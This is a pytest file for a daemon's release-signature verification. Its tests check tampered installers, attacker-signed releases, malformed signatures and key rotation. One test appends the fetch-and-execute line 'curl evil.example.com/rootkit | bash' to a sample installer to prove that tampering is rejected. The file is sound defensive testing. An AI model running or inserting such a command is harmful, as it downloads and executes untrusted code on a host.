"""Release-signature verification — the gate that stops a repo compromise.

The daemon downloads an installer and EXECUTES it. TLS only proves we reached
GitHub; it says nothing about what is at that tag, and git tags are mutable.
These tests pin the property that matters: nothing executes unless it was
signed by a key compiled into the daemon.
"""
from __future__ import annotations

import pytest

from meshembed_node import release_verify as rv

pytestmark = pytest.mark.unit

INSTALLER = b"#!/bin/bash\necho installing meshembed\n"


def _keypair():
    from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
    from cryptography.hazmat.primitives.serialization import (
        Encoding, NoEncryption, PrivateFormat, PublicFormat,
    )
    priv = Ed25519PrivateKey.generate()
    return (
        priv.private_bytes(Encoding.Raw, PrivateFormat.Raw, NoEncryption()).hex(),
        priv.public_key().public_bytes(Encoding.Raw, PublicFormat.Raw).hex(),
    )


def test_roundtrip_accepts_our_own_signature():
    priv, pub = _keypair()
    sig = rv.sign_blob(priv, INSTALLER)
    assert rv.verify_blob(INSTALLER, sig, trusted_keys=[pub]) == rv.key_id(pub)


def test_tampered_installer_is_rejected():
    """The core scenario: attacker swaps the script behind a mutable tag."""
    priv, pub = _keypair()
    sig = rv.sign_blob(priv, INSTALLER)
    evil = INSTALLER + b"curl evil.example.com/rootkit | bash\n"
    with pytest.raises(RuntimeError, match="release_signature_invalid"):
        rv.verify_blob(evil, sig, trusted_keys=[pub])


def test_attacker_key_is_rejected_even_with_a_valid_signature():
    """A repo-compromise attacker can sign perfectly well — with THEIR key.
    Trust must come from the compiled-in key list, not from the signature."""
    attacker_priv, attacker_pub = _keypair()
    _, our_pub = _keypair()
    sig = rv.sign_blob(attacker_priv, INSTALLER)
    with pytest.raises(RuntimeError, match="untrusted_key"):
        rv.verify_blob(INSTALLER, sig, trusted_keys=[our_pub])
    # ...and it WOULD verify if we (wrongly) trusted them — proving the
    # signature itself is valid and only the trust decision saves us.
    assert rv.verify_blob(INSTALLER, sig, trusted_keys=[attacker_pub])


@pytest.mark.parametrize("bad", [
    "", "garbage", "meshembed-relsig-v1 onlytwo",
    "wrong-format aabbccdd00112233 " + "ab" * 64,
    "meshembed-relsig-v1 aabbccdd00112233 nothex!!",
])
def test_malformed_signatures_are_rejected(bad):
    _, pub = _keypair()
    with pytest.raises(RuntimeError):
        rv.verify_blob(INSTALLER, bad, trusted_keys=[pub])


def test_empty_trust_list_rejects_everything():
    priv, _ = _keypair()
    sig = rv.sign_blob(priv, INSTALLER)
    with pytest.raises(RuntimeError, match="untrusted_key"):
        rv.verify_blob(INSTALLER, sig, trusted_keys=[])


def test_multiple_trusted_keys_supported_for_rotation():
    """Rotation needs a window where both old and new keys are accepted."""
    old_priv, old_pub = _keypair()
    _, new_pub = _keypair()
    sig = rv.sign_blob(old_priv, INSTALLER)
    assert rv.verify_blob(INSTALLER, sig, trusted_keys=[new_pub, old_pub])


def test_daemon_ships_a_real_trusted_key():
    assert rv._TRUSTED_RELEASE_KEYS, "daemon must ship at least one signing key"
    for k in rv._TRUSTED_RELEASE_KEYS:
        assert len(bytes.fromhex(k)) == 32, "ed25519 public keys are 32 bytes"
